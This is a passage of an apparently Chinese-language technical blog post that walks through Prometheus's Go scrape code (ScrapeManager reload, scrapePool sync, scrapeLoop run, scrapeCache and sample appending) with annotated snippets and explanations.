class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(m *ScrapeManager)</span> <span class="title">reload</span><span class="params">(t <span class="keyword">map</span>[<span class="keyword">string</span>][]*targetgroup.Group)</span></span> &#123;</span><br><span class="line"><span class="keyword">for</span> tsetName, tgroup := <span class="keyword">range</span> t &#123;</span><br><span class="line">scrapeConfig, ok := m.scrapeConfigs[tsetName]</span><br><span class="line"><span class="keyword">if</span> !ok &#123;</span><br><span class="line">level.Error(m.logger).Log(<span class="string">"msg"</span>, <span class="string">"error reloading target set"</span>, <span class="string">"err"</span>, fmt.Sprintf(<span class="string">"invalid config id:%v"</span>, tsetName))</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//检查ScrapePool中服务是否存在，不存在构建新的ScrapePool</span></span><br><span class="line"><span class="comment">// Scrape pool doesn't exist so start a new one.</span></span><br><span class="line">existing, ok := m.scrapePools[tsetName]</span><br><span class="line"><span class="keyword">if</span> !ok &#123;</span><br><span class="line">sp := newScrapePool(scrapeConfig, m.<span class="built_in">append</span>, log.With(m.logger, <span class="string">"scrape_pool"</span>, tsetName))</span><br><span class="line">m.scrapePools[tsetName] = sp</span><br><span class="line">sp.Sync(tgroup)</span><br><span class="line"><span class="comment">//调用Sync方法同步目标服务和启动scrape</span></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">//同步目标服务并启动scrape</span></span><br><span class="line">existing.Sync(tgroup)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>sp.Sync方法主要用于将tgroup转换为Target类型，再调用scrapePool.sync方法同步scrape服务。</p><p>ScrapePool主要管理目标服务和scrapeLoop</p><p>Sync方法具体实现：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Sync converts target groups into actual scrape targets and synchronizes</span></span><br><span class="line"><span class="comment">// the currently running scraper with the resulting set.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(sp *scrapePool)</span> <span class="title">Sync</span><span class="params">(tgs []*targetgroup.Group)</span></span> &#123;</span><br><span class="line">start := time.Now()</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> all []*Target</span><br><span class="line">sp.mtx.Lock()</span><br><span class="line">sp.droppedTargets = []*Target&#123;&#125;</span><br><span class="line"><span class="keyword">for</span> _, tg := <span class="keyword">range</span> tgs &#123;</span><br><span class="line">        <span class="comment">//Group转换成target</span></span><br><span class="line">targets, err := targetsFromGroup(tg, sp.config)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">level.Error(sp.logger).Log(<span class="string">"msg"</span>, <span class="string">"creating targets failed"</span>, <span class="string">"err"</span>, err)</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> _, t := <span class="keyword">range</span> targets &#123;</span><br><span class="line">            <span class="comment">//检查Target是否存在有有效的Label</span></span><br><span class="line"><span class="keyword">if</span> t.Labels().Len() &gt; <span class="number">0</span> &#123;</span><br><span class="line">all = <span class="built_in">append</span>(all, t)</span><br><span class="line">                <span class="comment">//记录无效的Target</span></span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> t.DiscoveredLabels().Len() &gt; <span class="number">0</span> &#123;</span><br><span class="line">sp.droppedTargets = <span class="built_in">append</span>(sp.droppedTargets, t)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">sp.mtx.Unlock()</span><br><span class="line">    <span class="comment">//同步scrape服务</span></span><br><span class="line">sp.sync(all)</span><br><span class="line"><span class="comment">//更新系统指标</span></span><br><span class="line">targetSyncIntervalLength.WithLabelValues(sp.config.JobName).Observe(</span><br><span class="line">time.Since(start).Seconds(),</span><br><span class="line">)</span><br><span class="line">targetScrapePoolSyncsCounter.WithLabelValues(sp.config.JobName).Inc()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>scrapePool.sync方法将输入参数targets与原有的targets列表sp.targets进行对比，如果有新的target加入，就创建新的targetScraper和scrapeLoop，并且启动新的scrapeLoop，如果发现已经失效的target,就会停止scrapeLoop服务并删除对应的target和scrapeLoop</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// sync takes a list of potentially duplicated targets, deduplicates them, starts</span></span><br><span class="line"><span class="comment">// scrape loops for new targets, and stops scrape loops for disappeared targets.</span></span><br><span class="line"><span class="comment">// It returns after all stopped scrape loops terminated.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(sp *scrapePool)</span> <span class="title">sync</span><span class="params">(targets []*Target)</span></span> &#123;</span><br><span class="line">sp.mtx.Lock()</span><br><span class="line"><span class="keyword">defer</span> sp.mtx.Unlock()</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> (</span><br><span class="line">uniqueTargets = <span class="keyword">map</span>[<span class="keyword">uint64</span>]<span class="keyword">struct</span>&#123;&#125;&#123;&#125;</span><br><span class="line">interval      = time.Duration(sp.config.ScrapeInterval)</span><br><span class="line">timeout       = time.Duration(sp.config.ScrapeTimeout)</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _, t := <span class="keyword">range</span> targets &#123;</span><br><span class="line">t := t</span><br><span class="line">hash := t.hash()</span><br><span class="line">uniqueTargets[hash] = <span class="keyword">struct</span>&#123;&#125;&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> _, ok := sp.targets[hash]; !ok &#123;</span><br><span class="line">s := &amp;targetScraper&#123;Target: t, client: sp.client, timeout: timeout&#125;</span><br><span class="line">l := sp.newLoop(t, s)</span><br><span class="line"></span><br><span class="line">sp.targets[hash] = t</span><br><span class="line">sp.loops[hash] = l</span><br><span class="line"></span><br><span class="line"><span class="keyword">go</span> l.run(interval, timeout, <span class="literal">nil</span>)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> wg sync.WaitGroup</span><br><span class="line"></span><br><span class="line"><span class="comment">// Stop and remove old targets and scraper loops.</span></span><br><span class="line"><span class="keyword">for</span> hash := <span class="keyword">range</span> sp.targets &#123;</span><br><span class="line"><span class="keyword">if</span> _, ok := uniqueTargets[hash]; !ok &#123;</span><br><span class="line">wg.Add(<span class="number">1</span>)</span><br><span class="line"><span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">(l loop)</span></span> &#123;</span><br><span class="line">l.stop()</span><br><span class="line">wg.Done()</span><br><span class="line">&#125;(sp.loops[hash])</span><br><span class="line"></span><br><span class="line"><span class="built_in">delete</span>(sp.loops, hash)</span><br><span class="line"><span class="built_in">delete</span>(sp.targets, hash)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Wait for all potentially stopped scrapers to terminate.</span></span><br><span class="line"><span class="comment">// This covers the case of flapping targets. If the server is under high load, a new scraper</span></span><br><span class="line"><span class="comment">// may be active and tries to insert. The old scraper that didn't terminate yet could still</span></span><br><span class="line"><span class="comment">// be inserting a previous sample set.</span></span><br><span class="line">wg.Wait()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>scrapeLoop是scrape的直接管理者，每个scrapeLoop都通过一个goroutine来运行，scrapeLoop控制scrape进行指标的拉取</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(sl *scrapeLoop)</span> <span class="title">run</span><span class="params">(interval, timeout time.Duration, errc <span class="keyword">chan</span>&lt;- error)</span></span> &#123;</span><br><span class="line"><span class="keyword">select</span> &#123;</span><br><span class="line"><span class="keyword">case</span> &lt;-time.After(sl.scraper.offset(interval)):</span><br><span class="line"><span class="comment">// Continue after a scraping offset.</span></span><br><span class="line"><span class="keyword">case</span> &lt;-sl.scrapeCtx.Done():</span><br><span class="line"><span class="built_in">close</span>(sl.stopped)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> last time.Time</span><br><span class="line">     </span><br><span class="line">ticker := time.NewTicker(interval)</span><br><span class="line"><span class="keyword">defer</span> ticker.Stop()</span><br><span class="line">    <span class="comment">//初始化指标存储空间</span></span><br><span class="line">buf := bytes.NewBuffer(<span class="built_in">make</span>([]<span class="keyword">byte</span>, <span class="number">0</span>, <span class="number">16000</span>))</span><br><span class="line"></span><br><span class="line">mainLoop:</span><br><span class="line"><span class="keyword">for</span> &#123;</span><br><span class="line">buf.Reset()</span><br><span class="line"><span class="keyword">select</span> &#123;</span><br><span class="line">            <span class="comment">//停止scrapeLoop</span></span><br><span class="line"><span class="keyword">case</span> &lt;-sl.ctx.Done():</span><br><span class="line"><span class="built_in">close</span>(sl.stopped)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line"><span class="keyword">case</span> &lt;-sl.scrapeCtx.Done():</span><br><span class="line"><span class="keyword">break</span> mainLoop</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> (</span><br><span class="line">start             = time.Now()</span><br><span class="line">scrapeCtx, cancel = context.WithTimeout(sl.ctx, timeout)</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment">// Only record after the first scrape.</span></span><br><span class="line"><span class="keyword">if</span> !last.IsZero() &#123;</span><br><span class="line">targetIntervalLength.WithLabelValues(interval.String()).Observe(</span><br><span class="line">time.Since(last).Seconds(),</span><br><span class="line">)</span><br><span class="line">&#125;</span><br><span class="line">        <span class="comment">//根据最后一次的scrape到指标的大小来申请本次存储空间</span></span><br><span class="line">b := sl.buffers.Get(sl.lastScrapeSize)</span><br><span class="line">buf := bytes.NewBuffer(b)</span><br><span class="line"><span class="comment">//scrape指标</span></span><br><span class="line">scrapeErr := sl.scraper.scrape(scrapeCtx, buf)</span><br><span class="line">cancel()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> scrapeErr == <span class="literal">nil</span> &#123;</span><br><span class="line">b = buf.Bytes()</span><br><span class="line"><span class="comment">// <span class="doctag">NOTE:</span> There were issues with misbehaving clients in the past</span></span><br><span class="line"><span class="comment">// that occasionally returned empty results. We don't want those</span></span><br><span class="line"><span class="comment">// to falsely reset our buffer size.</span></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(b) &gt; <span class="number">0</span> &#123;</span><br><span class="line">                <span class="comment">//记录本次scrape到指标的大小</span></span><br><span class="line">sl.lastScrapeSize = <span class="built_in">len</span>(b)</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">level.Debug(sl.l).Log(<span class="string">"msg"</span>, <span class="string">"Scrape failed"</span>, <span class="string">"err"</span>, scrapeErr.Error())</span><br><span class="line"><span class="keyword">if</span> errc != <span class="literal">nil</span> &#123;</span><br><span class="line">errc &lt;- scrapeErr</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// A failed scrape is the same as an empty scrape,</span></span><br><span class="line"><span class="comment">// we still call sl.append to trigger stale markers.</span></span><br><span class="line">        <span class="comment">//存储指标</span></span><br><span class="line">total, added, appErr := sl.<span class="built_in">append</span>(b, start)</span><br><span class="line"><span class="keyword">if</span> appErr != <span class="literal">nil</span> &#123;</span><br><span class="line">level.Warn(sl.l).Log(<span class="string">"msg"</span>, <span class="string">"append failed"</span>, <span class="string">"err"</span>, appErr)</span><br><span class="line"><span class="comment">// The append failed, probably due to a parse error or sample limit.</span></span><br><span class="line"><span class="comment">// Call sl.append again with an empty scrape to trigger stale markers.</span></span><br><span class="line"><span class="keyword">if</span> _, _, err := sl.<span class="built_in">append</span>([]<span class="keyword">byte</span>&#123;&#125;, start); err != <span class="literal">nil</span> &#123;</span><br><span class="line">level.Warn(sl.l).Log(<span class="string">"msg"</span>, <span class="string">"append failed"</span>, <span class="string">"err"</span>, err)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//对象复用</span></span><br><span class="line">sl.buffers.Put(b)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> scrapeErr == <span class="literal">nil</span> &#123;</span><br><span class="line">scrapeErr = appErr</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//统计采集到的指标</span></span><br><span class="line">sl.report(start, time.Since(start), total, added, scrapeErr)</span><br><span class="line">last = start</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> &#123;</span><br><span class="line"><span class="keyword">case</span> &lt;-sl.ctx.Done():</span><br><span class="line"><span class="built_in">close</span>(sl.stopped)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line"><span class="keyword">case</span> &lt;-sl.scrapeCtx.Done():</span><br><span class="line"><span class="keyword">break</span> mainLoop</span><br><span class="line"><span class="keyword">case</span> &lt;-ticker.C:</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">close</span>(sl.stopped)</span><br><span class="line"></span><br><span class="line">sl.endOfRunStaleness(last, ticker, interval)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>run方法中调用sl.scraper.scrape进行指标采集，并将采集到的指标通过sl.append方法进行存储。</p><p>再scrape过程中为了提供性能，使用sync.Pool机制来复用对象，再每次scrape后都会向pool申请和scrape结果相同大小的byte slice，并添加到sl.buffers中，以便供下一次获取指标使用</p><p>流程：</p><p><img src="/images/1572416216523.png" alt="1572416216523"></p><h2 id="LocalStorage-RemoteStorage"><a href="#LocalStorage-RemoteStorage" class="headerlink" title="LocalStorage/RemoteStorage"></a>LocalStorage/RemoteStorage</h2><p>Prometheus再通过scrape获取指标后，调用scrapeLoop.append方法将指标存储到fanoutStorage组件中，但再scrape与fanoutStorage之间加了一层scrapeCache，用于指标合法行校验。</p><p>scrapeCache缓存了两种不合法的指标：</p><p>1）指标纬度为空，无效指标</p><p>2）连续两次指标存储中，第一次存储的不带时间戳指标再第二次存储的不带时间戳指标中不存在，这部分指标过期指标</p><p>scrapeCache:</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// scrapeCache tracks mappings of exposed metric strings to label sets and</span></span><br><span class="line"><span class="comment">// storage references. Additionally, it tracks staleness of series between</span></span><br><span class="line"><span class="comment">// scrapes.</span></span><br><span class="line"><span class="keyword">type</span> scrapeCache <span class="keyword">struct</span> &#123;</span><br><span class="line">iter <span class="keyword">uint64</span> <span class="comment">// Current scrape iteration.</span></span><br><span class="line"><span class="comment">// 被缓存的批次数</span></span><br><span class="line"><span class="comment">// Parsed string to an entry with information about the actual label set</span></span><br><span class="line"><span class="comment">// and its storage reference.</span></span><br><span class="line">entries <span class="keyword">map</span>[<span class="keyword">string</span>]*cacheEntry</span><br><span class="line"><span class="comment">// 缓存本次采集的指标</span></span><br><span class="line"><span class="comment">// Cache of dropped metric strings and their iteration. The iteration must</span></span><br><span class="line"><span class="comment">// be a pointer so we can update it without setting a new entry with an unsafe</span></span><br><span class="line"><span class="comment">// string in addDropped().</span></span><br><span class="line">dropped <span class="keyword">map</span>[<span class="keyword">string</span>]*<span class="keyword">uint64</span></span><br><span class="line">    <span class="comment">//缓存本次采集的指标</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// seriesCur and seriesPrev store the labels of series that were seen</span></span><br><span class="line"><span class="comment">// in the current and previous scrape.</span></span><br><span class="line"><span class="comment">// We hold two maps and swap them out to save allocations.</span></span><br><span class="line">seriesCur  <span class="keyword">map</span>[<span class="keyword">uint64</span>]labels.Labels</span><br><span class="line">seriesPrev <span class="keyword">map</span>[<span class="keyword">uint64</span>]labels.Labels</span><br><span class="line">    <span class="comment">//缓存上次采集的指标</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">newScrapeCache</span><span class="params">()</span> *<span class="title">scrapeCache</span></span> &#123;</span><br><span class="line"><span class="keyword">return</span> &amp;scrapeCache&#123;</span><br><span class="line">entries:    <span class="keyword">map</span>[<span class="keyword">string</span>]*cacheEntry&#123;&#125;,</span><br><span class="line">dropped:    <span class="keyword">map</span>[<span class="keyword">string</span>]*<span class="keyword">uint64</span>&#123;&#125;,</span><br><span class="line">seriesCur:  <span class="keyword">map</span>[<span class="keyword">uint64</span>]labels.Labels&#123;&#125;,</span><br><span class="line">seriesPrev: <span class="keyword">map</span>[<span class="keyword">uint64</span>]labels.Labels&#123;&#125;,</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>scrapeCache主要方法：</p><p>iterDone()；用于scrapeCache缓存整理</p><p>get:根据指标信息met获取cacheEntry结构</p><p>addRef：根据指标信息增加cacheEntry节点</p><p>addDropped:添加无效指标信息到dropped</p><p>getDropped: 判断met是否为无效指标</p><p>trackStaleness:添加不带时间戳的指标到seriesCur列表</p><p>forEachStale：查找过期的指标</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(sl *scrapeLoop)</span> <span class="title">append</span><span class="params">(b []<span class="keyword">byte</span>, ts time.Time)</span> <span class="params">(total, added <span class="keyword">int</span>, err error)</span></span> &#123;</span><br><span class="line"><span class="keyword">var</span> (</span><br><span class="line">app            = sl.appender()</span><br><span class="line">p              = textparse.New(b)</span><br><span class="line">defTime        = timestamp.FromTime(ts)</span><br><span class="line">numOutOfOrder  = <span class="number">0</span></span><br><span class="line">numDuplicates  = <span class="number">0</span></span><br><span class="line">numOutOfBounds = <span class="number">0</span></span><br><span class="line">)</span><br><span class="line"><span class="keyword">var</span> sampleLimitErr error</span><br><span class="line"></span><br><span class="line">loop:</span><br><span class="line"><span class="keyword">for</span> p.Next() &#123;</span><br><span class="line">total++</span><br><span class="line"></span><br><span class="line">t := defTime</span><br><span class="line">met, tp, v := p.At()</span><br><span class="line"><span class="keyword">if</span> tp != <span class="literal">nil</span> &#123;</span><br><span class="line">t = *tp</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> sl.cache.getDropped(yoloString(met)) &#123;</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line">&#125;</span><br><span class="line">ce, ok := sl.cache.get(yoloString(met))</span><br><span class="line"><span class="keyword">if</span> ok &#123;</span><br><span class="line"><span class="keyword">switch</span> err = app.AddFast(ce.lset, ce.ref, t, v); err &#123;</span><br><span class="line"><span class="keyword">case</span> <span class="literal">nil</span>:</span><br><span class="line"><span class="keyword">if</span> tp == <span class="literal">nil</span> &#123;</span><br><span class="line">sl.cache.trackStaleness(ce.hash, ce.lset)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">case</span> storage.ErrNotFound:</span><br><span class="line">ok = <span class="literal">false</span></span><br><span class="line"><span class="keyword">case</span> storage.ErrOutOfOrderSample:</span><br><span class="line">numOutOfOrder++</span><br><span class="line">level.Debug(sl.l).Log(<span class="string">"msg"</span>, <span class="string">"Out of order sample"</span>, <span class="string">"series"</span>, <span class="keyword">string</span>(met))</span><br><span class="line">targetScrapeSampleOutOfOrder.Inc()</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line"><span class="keyword">case</span> storage.ErrDuplicateSampleForTimestamp:</span><br><span class="line">numDuplicates++</span><br><span class="line">level.Debug(sl.l).Log(<span class="string">"msg"</span>, <span class="string">"Duplicate sample for timestamp"</span>, <span class="string">"series"</span>, <span class="keyword">string</span>(met))</span><br><span class="line">targetScrapeSampleDuplicate.Inc()</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line"><span class="keyword">case</span> storage.ErrOutOfBounds:</span><br><span class="line">numOutOfBounds++</span><br><span class="line">level.Debug(sl.l).Log(<span class="string">"msg"</span>, <span class="string">"Out of bounds metric"</span>, <span class="string">"series"</span>, <span class="keyword">string</span>(met))</span><br><span class="line">targetScrapeSampleOutOfBounds.Inc()</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line"><span class="keyword">case</span> errSampleLimit:</span><br><span class="line"><span class="comment">// Keep on parsing output if we hit the limit, so we report the correct</span></span><br><span class="line"><span class="comment">// total number of samples scraped.</span></span><br><span class="line">sampleLimitErr = err</span><br><span class="line">added++</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line"><span class="keyword">break</span> loop</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> !ok &#123;</span><br><span class="line"><span class="keyword">var</span> lset labels.Labels</span><br><span class="line"></span><br><span class="line">mets := p.Metric(&amp;lset)</span><br><span class="line">hash := lset.Hash()</span><br><span class="line"></span><br><span class="line"><span class="comment">// Hash label set as it is seen local to the target. Then add target labels</span></span><br><span class="line"><span class="comment">// and relabeling and store the final label set.</span></span><br><span class="line">lset = sl.sampleMutator(lset)</span><br><span class="line"></span><br><span class="line"><span class="comment">// The label set may be set to nil to indicate dropping.</span></span><br><span class="line"><span 